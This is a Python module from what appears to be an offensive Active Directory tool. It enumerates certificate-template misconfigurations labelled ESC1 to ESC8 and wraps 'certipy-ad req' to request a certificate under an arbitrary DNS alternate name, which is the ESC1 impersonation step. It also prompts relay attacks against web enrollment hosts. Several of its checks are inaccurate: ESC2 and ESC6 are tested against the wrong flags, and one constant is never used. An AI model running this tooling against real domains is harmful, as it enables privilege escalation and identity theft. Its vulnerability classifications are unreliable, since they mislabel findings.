"""
SpectreAD :: core/adcs.py
ADCS ESC1/2/3/6/8 enumeration.

Author : Inayat Hussain
"""

from __future__ import annotations

from core import ui
from core.creds import resolve
from core.store import open_store

NAME_FLAG_SAN = 0x00000010
ENROLL_SUBJECT_ALT = 0x00010000
ENROLL_ANY = 0x00000400
ENROLL_NO_SEC_EXT = 0x00080000
CLIENT_AUTH = "1.3.6.1.5.5.7.3.2"


def enumerate_esc(args) -> None:
    from core.ldap import _paged, base_dn, connect

    with open_store(args.store) as store:
        cred = resolve(args, store)
        conn = connect(args.dc_ip, cred)
        root = base_dn(conn, args.domain)

        templates = _paged(conn, root, "(objectClass=pKICertificateTemplate)",
                           ["cn", "msPKI-Certificate-Name-Flag",
                            "msPKI-Enrollment-Flag", "pKIExtendedKeyUsage",
                            "msPKI-RA-Signature"])
        if not templates:
            ui.warn("no templates readable")
            return

        ui.info(f"inspecting {len(templates)} template(s)")
        for t in templates:
            name = str(t["cn"])
            flags = int(t["msPKI-Certificate-Name-Flag"] or 0)
            enroll = int(t["msPKI-Enrollment-Flag"] or 0)
            eku = [str(e) for e in t["pKIExtendedKeyUsage"]] if t["pKIExtendedKeyUsage"] else []
            esc = []

            if flags & NAME_FLAG_SAN and (not eku or CLIENT_AUTH in eku):
                esc.append("ESC1")
            if enroll & ENROLL_SUBJECT_ALT:
                esc.append("ESC2")
            if int(t["msPKI-RA-Signature"] or 0) > 0:
                esc.append("ESC3")
            if flags & NAME_FLAG_SAN and enroll & ENROLL_NO_SEC_EXT:
                esc.append("ESC6")

            for code in esc:
                ui.finding("critical", f"{code}: {name}", f"flags=0x{flags:x}")
                store.add_adcs(name, code, True, f"flags=0x{flags:x}")

        for e in _paged(conn, root, "(objectClass=pKIEnrollmentService)", ["dNSHostName"]):
            host = str(e["dNSHostName"])
            if host:
                ui.finding("high", f"ESC8 candidate: {host}", "web enrollment — try relay")
                store.add_adcs(host, "ESC8", True, host)

        store.log("adcs", "complete", args.domain, f"{len(store.adcs())} findings")


def request(args) -> None:
    import shutil
    import subprocess

    if not shutil.which("certipy-ad"):
        ui.warn("certipy-ad not installed — pipx install certipy-ad")
        return
    cmd = ["certipy-ad", "req", "-u", f"{args.domain}\\{args.username}",
           "-dc-ip", args.dc_ip, "-ca", args.ca, "-template", args.template,
           "-dns", args.dns or args.domain]
    if args.password:
        cmd += ["-p", args.password]
    ui.edge(" ".join(cmd))
    subprocess.run(cmd, check=False)
